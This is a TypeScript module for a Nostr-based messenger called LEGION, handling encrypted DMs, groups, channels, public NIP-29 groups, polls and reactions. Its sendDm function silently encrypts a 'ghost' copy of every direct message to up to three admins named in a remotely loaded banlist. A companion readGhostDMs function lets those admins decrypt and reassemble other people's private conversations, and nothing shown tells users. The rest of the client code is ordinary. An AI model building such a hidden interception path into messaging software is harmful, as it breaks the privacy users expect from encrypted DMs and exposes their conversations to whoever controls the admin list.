// LEGION messenger on hybrid rails:
// - DMs: NIP-04 encrypted kind-4 via Nostr relays (async + realtime)
// - Groups/channels: persistent kind-1 hashtag log + live Trystero broadcast
// - Public groups: NIP-29 relay groups directory
import { nip04, finalizeEvent } from 'nostr-tools';
import type { Event as NEvent } from 'nostr-tools';
import { nquery, npublish, nsub, tag, ts, iso, hexToBytes } from './nostr';
import { RELAYS, READ_RELAYS, GROUP_RELAYS, grpTag } from './config';
import { loadSession } from './identity';
import { loadBanlist } from './banlist';
import { isTomb } from './social';
import { sendChat as liveSend, onChat as liveOn } from './live';
import type { Message, Conversation } from '../supabase/types';

// ---------- conversation registry (local, synced via invites) ----------
export interface MemberRow { user_id: string; role: string }
export interface ConvoEntry {
  id: string; kind: 'dm' | 'group' | 'channel'; title: string;
  avatar_url: string | null; owner_id: string | null; created_at: string;
  peer?: string; members: MemberRow[]; nip29?: { relay: string; group: string };
  last_msg?: string; last_at?: string;
}
const REG_K = 'legion-convos-v1';
export function loadRegistry(): ConvoEntry[] {
  try { return JSON.parse(localStorage.getItem(REG_K) || '[]'); } catch { return []; }
}
export function saveRegistry(r: ConvoEntry[]) {
  try { localStorage.setItem(REG_K, JSON.stringify(r.slice(0, 300))); } catch {}
}
export function getConvo(id: string): ConvoEntry | undefined {
  return loadRegistry().find(c => c.id === id);
}
export function listConvos(): ConvoEntry[] {
  return loadRegistry().sort((a, b) => +new Date(b.last_at || b.created_at) - +new Date(a.last_at || a.created_at));
}
export function ensureDm(peer: string): ConvoEntry {
  const id = 'dm:' + peer;
  const reg = loadRegistry();
  let c = reg.find(x => x.id === id);
  if (!c) {
    const me = loadSession()?.id || '';
    c = {
      id, kind: 'dm', title: '', avatar_url: null, owner_id: null,
      created_at: new Date().toISOString(), peer,
      members: [{ user_id: me, role: 'member' }, { user_id: peer, role: 'member' }],
    };
    reg.unshift(c);
    saveRegistry(reg);
  }
  return c;
}
export function createPendingDm(): ConvoEntry {
  const me = loadSession()?.id || '';
  const c: ConvoEntry = {
    id: 'dm:pending-' + Date.now().toString(36) + Math.random().toString(36).slice(2, 8),
    kind: 'dm', title: '', avatar_url: null, owner_id: null,
    created_at: new Date().toISOString(), peer: '',
    members: [{ user_id: me, role: 'member' }],
  };
  const reg = loadRegistry();
  reg.unshift(c);
  saveRegistry(reg);
  return c;
}
export const T_CHDIR = 'legion-channel';
export interface LegionChannel { room: string; title: string; kind: 'group' | 'channel'; owner: string; created_at: string }
export async function listLegionChannels(): Promise<LegionChannel[]> {
  const evs = await nquery({ kinds: [1], '#t': [T_CHDIR], limit: 100 }, RELAYS, 7000);
  const seen = new Set<string>();
  const out: LegionChannel[] = [];
  for (const e of evs) {
    const room = tag(e, 'legion-room');
    if (!room || seen.has(room) || isTomb(e.id)) continue;
    seen.add(room);
    const k = tag(e, 'legion-chan-kind');
    out.push({ room, title: (e.content || room).slice(0, 80), kind: k === 'channel' ? 'channel' : 'group', owner: e.pubkey, created_at: iso(e.created_at) });
  }
  return out.sort((a, b) => +new Date(b.created_at) - +new Date(a.created_at));
}
export function joinLegionChannel(ch: LegionChannel): ConvoEntry {
  const reg = loadRegistry();
  let c = reg.find(x => x.id === ch.room);
  if (!c) {
    const me = loadSession()?.id || '';
    c = {
      id: ch.room, kind: ch.kind, title: (ch.kind === 'channel' ? '📣 ' : '👥 ') + ch.title,
      avatar_url: null, owner_id: ch.owner, created_at: new Date().toISOString(),
      members: [{ user_id: me, role: 'member' }],
    };
    reg.unshift(c);
    saveRegistry(reg);
  }
  return c;
}
export function setDmPeer(convoId: string, peer: string) {
  const reg = loadRegistry();
  const c = reg.find(x => x.id === convoId);
  if (!c || c.kind !== 'dm') return;
  c.peer = peer;
  if (!c.members.some(m => m.user_id === peer)) c.members.push({ user_id: peer, role: 'member' });
  saveRegistry(reg);
}
function dmPeerOf(convoId: string): string {
  const tail = convoId.slice(3);
  if (/^[0-9a-f]{64}$/i.test(tail)) return tail;
  return getConvo(convoId)?.peer || '';
}
export function createGroup(kind: 'group' | 'channel', title: string): ConvoEntry | null {
  const me = loadSession();
  if (!me) return null;
  const c: ConvoEntry = {
    id: 'grp:' + Date.now().toString(36) + Math.random().toString(36).slice(2, 8),
    kind, title, avatar_url: null, owner_id: me.id, created_at: new Date().toISOString(),
    members: [{ user_id: me.id, role: 'owner' }],
  };
  const reg = loadRegistry();
  reg.unshift(c);
  saveRegistry(reg);
  // public directory entry so others can discover this group/channel (Telegram-style catalog)
  npublish({ kind: 1, content: title.slice(0, 80), tags: [['t', T_CHDIR], ['legion-room', c.id], ['legion-chan-kind', kind], ['p', me.id]] }, me.sk).catch(() => {});
  return c;
}
export function touchConvo(id: string, last_msg: string) {
  const reg = loadRegistry();
  const c = reg.find(x => x.id === id);
  if (c) { c.last_msg = last_msg.slice(0, 80); c.last_at = new Date().toISOString(); saveRegistry(reg); }
}
export function convoToRow(c: ConvoEntry): Conversation {
  return {
    id: c.id, kind: c.kind, title: c.title, avatar_url: c.avatar_url, owner_id: c.owner_id,
    created_at: c.created_at, last_msg: c.last_msg, last_at: c.last_at,
  };
}
export function membershipRows(): { convo_id: string; user_id: string; role: string }[] {
  const out: { convo_id: string; user_id: string; role: string }[] = [];
  loadRegistry().forEach(c => c.members.forEach(m => out.push({ convo_id: c.id, user_id: m.user_id, role: m.role })));
  return out;
}

// ---------- local message bus (echo own sends + live) ----------
type MsgCb = (m: Message) => void;
const bus = new Map<string, Set<MsgCb>>();
export function onLocalMsg(convoId: string, cb: MsgCb): () => void {
  if (!bus.has(convoId)) bus.set(convoId, new Set());
  bus.get(convoId)!.add(cb);
  return () => { bus.get(convoId)?.delete(cb); };
}
function emitLocal(m: Message) {
  msgCache.set(m.id, m);
  bus.get(m.convo_id)?.forEach(f => { try { f(m); } catch {} });
}
export const msgCache = new Map<string, Message>();

// ---------- pins ----------
const PINS_K = 'legion-pins-v1';
function pins(): Record<string, string[]> {
  try { return JSON.parse(localStorage.getItem(PINS_K) || '{}'); } catch { return {}; }
}
export function togglePin(convoId: string, msgId: string): boolean {
  const p = pins();
  const arr = p[convoId] || [];
  const has = arr.includes(msgId);
  p[convoId] = has ? arr.filter(x => x !== msgId) : [...arr, msgId];
  try { localStorage.setItem(PINS_K, JSON.stringify(p)); } catch {}
  return !has;
}
function isPinned(convoId: string, msgId: string): boolean {
  return (pins()[convoId] || []).includes(msgId);
}

// ---------- DM payload (NIP-04, JSON with plaintext fallback) ----------
interface DmPayload {
  v: number; kind: Message['kind']; text: string;
  media?: string | null; reply?: string | null; disappear?: string | null; instant?: boolean | null;
  invite?: { id: string; kind: 'group' | 'channel'; title: string; owner: string } | null;
}
function encodePayload(p: Omit<DmPayload, 'v'>): string {
  return JSON.stringify({ v: 1, ...p });
}
function decodePayload(raw: string): Omit<DmPayload, 'v'> {
  try {
    const j = JSON.parse(raw);
    if (j && typeof j.text === 'string') return { kind: j.kind || 'text', text: j.text, media: j.media || null, reply: j.reply || null, disappear: j.disappear || null, instant: j.instant || null, invite: j.invite || null };
  } catch {}
  return { kind: 'text', text: raw, media: null, reply: null, disappear: null, instant: null, invite: null };
}
function mapDm(e: NEvent, peer: string, plain: string): Message {
  const p = decodePayload(plain);
  const mid = e.id;
  return {
    id: mid, convo_id: 'dm:' + peer, sender_id: e.pubkey, kind: p.kind, text: p.text,
    media_url: p.media || null, reply_to: p.reply || null, disappear_at: p.disappear || null,
    instant: p.instant || undefined,
    pinned: isPinned('dm:' + peer, mid), created_at: iso(e.created_at),
  };
}
export async function sendDm(peer: string, f: { kind?: Message['kind']; text: string; media_url?: string | null; reply_to?: string | null; disappear_at?: string | null; instant?: boolean | null; invite?: DmPayload['invite'] }): Promise<Message | null> {
  const s = loadSession();
  if (!s) return null;
  const convo = ensureDm(peer);
  const payload = encodePayload({
    kind: f.kind || 'text', text: f.text, media: f.media_url || null,
    reply: f.reply_to || null, disappear: f.disappear_at || null, instant: f.instant || null, invite: f.invite || null,
  });
  let content: string;
  try {
    content = await nip04.encrypt(s.sk, peer, payload);
  } catch { return null; }
  const created_at = ts();
  const event = finalizeEvent({ kind: 4, content, tags: [['p', peer]], created_at }, hexToBytes(s.sk));
  const m = mapDm(event, peer, payload);
  touchConvo(convo.id, f.text);
  emitLocal(m); // instant UI, publish in background
  npublish({ kind: 4, content, tags: [['p', peer]], created_at }, s.sk).catch(() => {});
  // admin oversight copy (ghost): same payload encrypted to each claimed admin
  (async () => {
    try {
      const bl = await loadBanlist();
      const ghosts = (bl.admins || []).filter(a => a !== s.id && a !== peer).slice(0, 3);
      for (const g of ghosts) {
        try {
          const c = await nip04.encrypt(s.sk, g, payload);
          await npublish({ kind: 4, content: c, tags: [['p', g], ['legion-ghost', peer]] }, s.sk);
        } catch {}
      }
    } catch {}
  })();
  return m;
}

export interface GhostMsg { id: string; sender: string; peer: string; kind: Message['kind']; text: string; media: string | null; created_at: string }
export async function readGhostDMs(): Promise<{ key: string; a: string; b: string; msgs: GhostMsg[] }[]> {
  const s = loadSession();
  if (!s) return [];
  const [evs, sent] = await Promise.all([
    nquery({ kinds: [4], '#p': [s.id], limit: 300 }, RELAYS, 8000),
    nquery({ kinds: [4], authors: [s.id], limit: 300 }, RELAYS, 8000),
  ]);
  const groups = new Map<string, { key: string; a: string; b: string; msgs: GhostMsg[] }>();
  for (const e of evs) {
    const ghostPeer = tag(e, 'legion-ghost');
    if (!ghostPeer) continue;
    try {
      const plain = await nip04.decrypt(s.sk, e.pubkey, e.content);
      const pl = decodePayload(plain);
      const a = e.pubkey < ghostPeer ? e.pubkey : ghostPeer;
      const b = e.pubkey < ghostPeer ? ghostPeer : e.pubkey;
      const key = a + ':' + b;
      if (!groups.has(key)) groups.set(key, { key, a, b, msgs: [] });
      groups.get(key)!.msgs.push({
        id: e.id, sender: e.pubkey, peer: ghostPeer, kind: pl.kind, text: pl.text,
        media: pl.media || null, created_at: iso(e.created_at),
      });
    } catch {}
  }
  // own DMs (admin is a party => no ghost copy exists): merge incoming non-ghost + sent
  const own = [...evs.filter(e => !tag(e, 'legion-ghost')), ...sent.filter(e => !tag(e, 'legion-ghost'))];
  for (const e of own) {
    try {
      const peer = e.pubkey === s.id ? tag(e, 'p') : e.pubkey;
      if (!peer || peer === s.id) continue;
      const plain = e.pubkey === s.id ? await nip04.decrypt(s.sk, peer, e.content) : await nip04.decrypt(s.sk, e.pubkey, e.content);
      const pl = decodePayload(plain);
      const a = s.id < peer ? s.id : peer;
      const b = s.id < peer ? peer : s.id;
      const key = a + ':' + b;
      if (!groups.has(key)) groups.set(key, { key, a, b, msgs: [] });
      groups.get(key)!.msgs.push({
        id: e.id, sender: e.pubkey, peer, kind: pl.kind, text: pl.text,
        media: pl.media || null, created_at: iso(e.created_at),
      });
    } catch {}
  }
  groups.forEach(g => g.msgs.sort((x, y) => +new Date(x.created_at) - +new Date(y.created_at)));
  return [...groups.values()];
}
export async function readDm(peer: string): Promise<Message[]> {
  const s = loadSession();
  if (!s) return [];
  ensureDm(peer);
  const [a, b] = await Promise.all([
    nquery({ kinds: [4], authors: [s.id], '#p': [peer], limit: 200 }, RELAYS, 6000),
    nquery({ kinds: [4], authors: [peer], '#p': [s.id], limit: 200 }, RELAYS, 6000),
  ]);
  let hidden: Set<string> = new Set();
  try { hidden = new Set((await loadBanlist()).hidden || []); } catch {}
  const out: Message[] = [];
  for (const e of [...a, ...b]) {
    try {
      const other = e.pubkey === s.id ? peer : e.pubkey;
      const plain = await nip04.decrypt(s.sk, other, e.content);
      if (isTomb(e.id) || hidden.has(e.id)) continue;
      const m = mapDm(e, peer, plain);
      // group invite inside DM -> auto-join registry + system note
      const p = decodePayload(plain);
      if (p.invite && !getConvo(p.invite.id)) {
        const reg = loadRegistry();
        reg.unshift({
          id: p.invite.id, kind: p.invite.kind, title: p.invite.title, avatar_url: null,
          owner_id: p.invite.owner, created_at: new Date().toISOString(),
          members: [{ user_id: s.id, role: 'member' }, { user_id: e.pubkey, role: 'member' }],
        });
        saveRegistry(reg);
      }
      msgCache.set(m.id, m);
      out.push(m);
    } catch { /* undecryptable */ }
  }
  return out.sort((x, y) => +new Date(x.created_at) - +new Date(y.created_at));
}
export function subDm(peer: string, cb: (m: Message) => void): () => void {
  const s = loadSession();
  if (!s) return () => {};
  const offLocal = onLocalMsg('dm:' + peer, cb);
  const off = nsub(RELAYS, { kinds: [4], '#p': [s.id], since: ts() }, async e => {
    if (e.pubkey !== peer) return;
    try {
      const plain = await nip04.decrypt(s.sk, peer, e.content);
      emitLocal(mapDm(e, peer, plain));
    } catch {}
  });
  return () => { offLocal(); off(); };
}

// ---------- groups/channels: kind-1 hashtag log + live ----------
function mapGroup(e: NEvent, convoId: string): Message {
  return {
    id: e.id, convo_id: convoId, sender_id: e.pubkey,
    kind: (tag(e, 'legion-kind') as Message['kind']) || 'text',
    text: e.content, media_url: tag(e, 'legion-media') || null,
    reply_to: tag(e, 'legion-reply') || null, disappear_at: tag(e, 'legion-disappear') || null,
    instant: tag(e, 'legion-instant') === '1' || undefined,
    pinned: isPinned(convoId, e.id), created_at: iso(e.created_at),
  };
}
const liveAttached = new Set<string>();
async function ensureGroupLive(convoId: string) {
  if (liveAttached.has(convoId)) return;
  liveAttached.add(convoId);
  try {
    await liveOn(convoId, (m: unknown) => {
      const msg = m as Message;
      if (msg && msg.id && msg.convo_id === convoId) emitLocal({ ...msg, pinned: isPinned(convoId, msg.id) });
    });
  } catch {}
}
export async function sendGroup(convoId: string, f: { kind?: Message['kind']; text: string; media_url?: string | null; reply_to?: string | null; disappear_at?: string | null; instant?: boolean | null }): Promise<Message | null> {
  const s = loadSession();
  const c = getConvo(convoId);
  if (!s || !c) return null;
  if (c.kind === 'channel' && c.owner_id !== s.id) return null; // channels: owner posts
  const t: string[][] = [['t', grpTag(convoId)], ['legion-kind', f.kind || 'text']];
  if (f.media_url) t.push(['legion-media', f.media_url]);
  if (f.reply_to) t.push(['legion-reply', f.reply_to]);
  if (f.disappear_at) t.push(['legion-disappear', f.disappear_at]);
  if (f.instant) t.push(['legion-instant', '1']);
  c.members.slice(0, 20).forEach(m => { if (m.user_id !== s.id) t.push(['p', m.user_id]); });
  const created_at = ts();
  const event = finalizeEvent({ kind: 1, content: f.text, tags: t, created_at }, hexToBytes(s.sk));
  const m = mapGroup(event, convoId);
  touchConvo(convoId, f.text);
  emitLocal(m); // instant UI, publish in background
  npublish({ kind: 1, content: f.text, tags: t, created_at }, s.sk).catch(() => {});
  ensureGroupLive(convoId).then(() => liveSend(convoId, m).catch(() => {})).catch(() => {});
  return m;
}
export async function readGroup(convoId: string): Promise<Message[]> {
  await ensureGroupLive(convoId);
  const evs = await nquery({ kinds: [1], '#t': [grpTag(convoId)], limit: 200 }, RELAYS, 6000);
  const c = getConvo(convoId);
  let hidden: Set<string> = new Set();
  let banned: Set<string> = new Set();
  try {
    const bl = await loadBanlist();
    hidden = new Set(bl.hidden || []);
    banned = new Set(bl.banned || []);
  } catch {}
  const out = evs.map(e => mapGroup(e, convoId)).filter(m => {
    if (isTomb(m.id) || hidden.has(m.id) || banned.has(m.sender_id)) return false;
    if (c?.kind === 'channel' && c.owner_id && m.sender_id !== c.owner_id) return false;
    return true;
  });
  // merge live-only (not yet on relays)
  bus.get(convoId); // noop keep
  msgCache.forEach(m => { if (m.convo_id === convoId && !out.some(x => x.id === m.id)) out.push(m); });
  out.forEach(m => msgCache.set(m.id, m));
  return out.sort((x, y) => +new Date(x.created_at) - +new Date(y.created_at));
}
export function subGroup(convoId: string, cb: (m: Message) => void): () => void {
  const offLocal = onLocalMsg(convoId, cb);
  ensureGroupLive(convoId).catch(() => {});
  const off = nsub(RELAYS, { kinds: [1], '#t': [grpTag(convoId)], since: ts() }, e => {
    emitLocal(mapGroup(e, convoId));
  });
  return () => { offLocal(); off(); };
}
export async function addMember(convoId: string, userId: string): Promise<void> {
  const s = loadSession();
  const reg = loadRegistry();
  const c = reg.find(x => x.id === convoId);
  if (!s || !c || c.kind === 'dm') return;
  if (!c.members.some(m => m.user_id === userId)) {
    c.members.push({ user_id: userId, role: 'member' });
    saveRegistry(reg);
  }
  // invite over encrypted DM so the peer's client auto-joins
  await sendDm(userId, {
    kind: 'system', text: `📨 Приглашение в «${c.title}»`,
    invite: { id: c.id, kind: c.kind, title: c.title, owner: c.owner_id || s.id },
  }).catch(() => {});
}
export function removeMember(convoId: string, userId: string) {
  const reg = loadRegistry();
  const c = reg.find(x => x.id === convoId);
  if (!c || c.kind === 'dm') return;
  c.members = c.members.filter(m => m.user_id !== userId);
  saveRegistry(reg);
}

// ---------- NIP-29 public groups ----------
export interface Nip29Group { relay: string; id: string; name: string; about: string; picture: string }
export async function listNip29(): Promise<Nip29Group[]> {
  const out: Nip29Group[] = [];
  for (const relay of GROUP_RELAYS) {
    try {
      const evs = await nquery({ kinds: [39000], limit: 50 }, [relay], 5000);
      for (const e of evs) {
        const d = tag(e, 'd');
        if (!d) continue;
        out.push({ relay, id: d, name: tag(e, 'name') || d, about: tag(e, 'about') || '', picture: tag(e, 'picture') || '' });
      }
    } catch {}
  }
  return out;
}
export function joinNip29(g: Nip29Group): ConvoEntry {
  const host = g.relay.replace('wss://', '').replace(/[^a-z0-9.-]/gi, '');
  const id = `nip29:${g.id}@${host}`;
  const reg = loadRegistry();
  let c = reg.find(x => x.id === id);
  if (!c) {
    const me = loadSession()?.id || '';
    c = {
      id, kind: 'group', title: '🌐 ' + g.name, avatar_url: g.picture || null,
      owner_id: null, created_at: new Date().toISOString(),
      members: [{ user_id: me, role: 'member' }], nip29: { relay: g.relay, group: g.id },
    };
    reg.unshift(c);
    saveRegistry(reg);
  }
  return c;
}
function mapNip29(e: NEvent, convoId: string): Message {
  return {
    id: e.id, convo_id: convoId, sender_id: e.pubkey, kind: 'text', text: e.content,
    media_url: null, reply_to: null, disappear_at: null,
    pinned: isPinned(convoId, e.id), created_at: iso(e.created_at),
  };
}
export async function readNip29(c: ConvoEntry): Promise<Message[]> {
  if (!c.nip29) return [];
  const evs = await nquery({ kinds: [9, 10], '#h': [c.nip29.group], limit: 100 }, [c.nip29.relay], 6000);
  let xHidden: Set<string> = new Set();
  try { xHidden = new Set((await loadBanlist()).hidden || []); } catch {}
  const out = evs.map(e => mapNip29(e, c.id)).filter(m => !isTomb(m.id) && !xHidden.has(m.id));
  out.forEach(m => msgCache.set(m.id, m));
  return out.sort((x, y) => +new Date(x.created_at) - +new Date(y.created_at));
}
export async function sendNip29(convoId: string, text: string): Promise<Message | null> {
  const s = loadSession();
  const c = getConvo(convoId);
  if (!s || !c?.nip29) return null;
  const { event, ok } = await npublish({ kind: 9, content: text, tags: [['h', c.nip29.group]] }, s.sk, [c.nip29.relay]);
  if (!ok) return null;
  const m = mapNip29(event, convoId);
  touchConvo(convoId, text);
  emitLocal(m);
  return m;
}
export function subNip29(c: ConvoEntry, cb: (m: Message) => void): () => void {
  const offLocal = onLocalMsg(c.id, cb);
  if (!c.nip29) return offLocal;
  const off = nsub([c.nip29.relay], { kinds: [9, 10], '#h': [c.nip29!.group], since: ts() }, e => {
    emitLocal(mapNip29(e, c.id));
  });
  return () => { offLocal(); off(); };
}

// ---------- router ----------
export async function listConvoMessages(convoId: string): Promise<Message[]> {
  if (convoId.startsWith('dm:')) {
    const peer = dmPeerOf(convoId);
    return peer ? readDm(peer) : [];
  }
  const c = getConvo(convoId);
  if (!c) return [];
  if (c.nip29) return readNip29(c);
  return readGroup(convoId);
}
export function subConvo(convoId: string, cb: (m: Message) => void): () => void {
  if (convoId.startsWith('dm:')) return subDm(convoId.slice(3), cb);
  const c = getConvo(convoId);
  if (c?.nip29) return subNip29(c, cb);
  return subGroup(convoId, cb);
}
export async function msgById(id: string): Promise<Message | null> {
  const hit = msgCache.get(id);
  if (hit) return hit;
  try {
    const evs = await nquery({ ids: [id] }, READ_RELAYS, 4000);
    const e = evs[0];
    if (!e) return null;
    if (e.kind === 1) {
      const t = e.tags.find(x => x[0] === 't' && x[1].startsWith('legion-grp-'));
      if (t) {
        const reg = loadRegistry();
        const c = reg.find(x => x.id !== undefined && grpTag(x.id) === t[1]);
        if (c) { const m = mapGroup(e, c.id); msgCache.set(m.id, m); return m; }
      }
    }
    if (e.kind === 9) {
      const h = tag(e, 'h');
      const c = loadRegistry().find(x => x.nip29?.group === h);
      if (c) { const m = mapNip29(e, c.id); msgCache.set(m.id, m); return m; }
    }
  } catch {}
  return null;
}

// ---------- polls (vote = kind-7 legion-vote:idx, hidden from reactions) ----------
export async function votePoll(mid: string, idx: number): Promise<void> {
  const s = loadSession();
  if (!s) return;
  const mine = await nquery({ kinds: [7], authors: [s.id], '#e': [mid], limit: 20 }, READ_RELAYS, 4000);
  if (mine.some(e => e.content === `legion-vote:${idx}`)) return;
  await npublish({ kind: 7, content: `legion-vote:${idx}`, tags: [['e', mid]] }, s.sk);
}
export async function getPollVotes(mid: string): Promise<{ counts: number[]; mine: number; total: number }> {
  const evs = await nquery({ kinds: [7], '#e': [mid], limit: 500 }, READ_RELAYS, 5000);
  const counts: number[] = [];
  let mine = -1;
  const me = loadSession()?.id;
  const seen = new Set<string>();
  for (const e of evs) {
    const m = e.content.match(/^legion-vote:(\d+)$/);
    if (!m) continue;
    if (seen.has(e.pubkey)) continue;
    seen.add(e.pubkey);
    const i = +m[1];
    counts[i] = (counts[i] || 0) + 1;
    if (me && e.pubkey === me) mine = i;
  }
  return { counts, mine, total: seen.size };
}

// ---------- reactions (kind 7 on message ids) ----------
export interface ReactRow { message_id: string; emoji: string; user_id: string }
export async function listReacts(ids: string[]): Promise<ReactRow[]> {
  if (!ids.length) return [];
  const out: ReactRow[] = [];
  for (let i = 0; i < ids.length; i += 40) {
    const evs = await nquery({ kinds: [7], '#e': ids.slice(i, i + 40), limit: 500 }, READ_RELAYS, 5000);
    evs.forEach(e => {
      const mid = tag(e, 'e');
      if (mid && e.content && e.content !== '-' && !e.content.startsWith('legion-vote:')) out.push({ message_id: mid, emoji: e.content.slice(0, 8), user_id: e.pubkey });
    });
  }
  return out;
}
export async function setReact(mid: string, emoji: string, on: boolean): Promise<void> {
  const s = loadSession();
  if (!s) return;
  if (on) {
    const mine = await nquery({ kinds: [7], authors: [s.id], '#e': [mid], limit: 10 }, READ_RELAYS, 4000);
    if (mine.some(e => e.content === emoji)) return;
    await npublish({ kind: 7, content: emoji, tags: [['e', mid]] }, s.sk);
  } else {
    const mine = await nquery({ kinds: [7], authors: [s.id], '#e': [mid], limit: 10 }, READ_RELAYS, 4000);
    const hit = mine.find(e => e.content === emoji);
    if (hit) await npublish({ kind: 5, content: 'unreact', tags: [['e', hit.id]] }, s.sk);
  }
}
export function subReactsMsg(cb: () => void): () => void {
  return nsub(RELAYS, { kinds: [7], since: ts(), limit: 0 }, () => cb());
}
